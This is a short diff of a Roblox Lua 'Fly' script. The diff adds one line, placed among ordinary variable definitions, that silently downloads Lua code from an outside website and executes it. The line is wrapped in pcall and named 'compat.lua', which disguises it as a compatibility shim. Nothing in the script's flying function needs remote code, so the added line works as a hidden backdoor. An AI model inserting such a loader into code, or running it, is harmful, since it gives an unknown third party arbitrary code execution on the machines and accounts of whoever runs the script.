@@ -10,7 +10,7 @@ local ctrl = {f = 0, b = 0, l = 0, r = 0}
 local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
 local maxspeed = 50 
 local speed = 0 
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 function Fly() 
 local bg = Instance.new("BodyGyro", torso) 
 bg.P = 9e4 
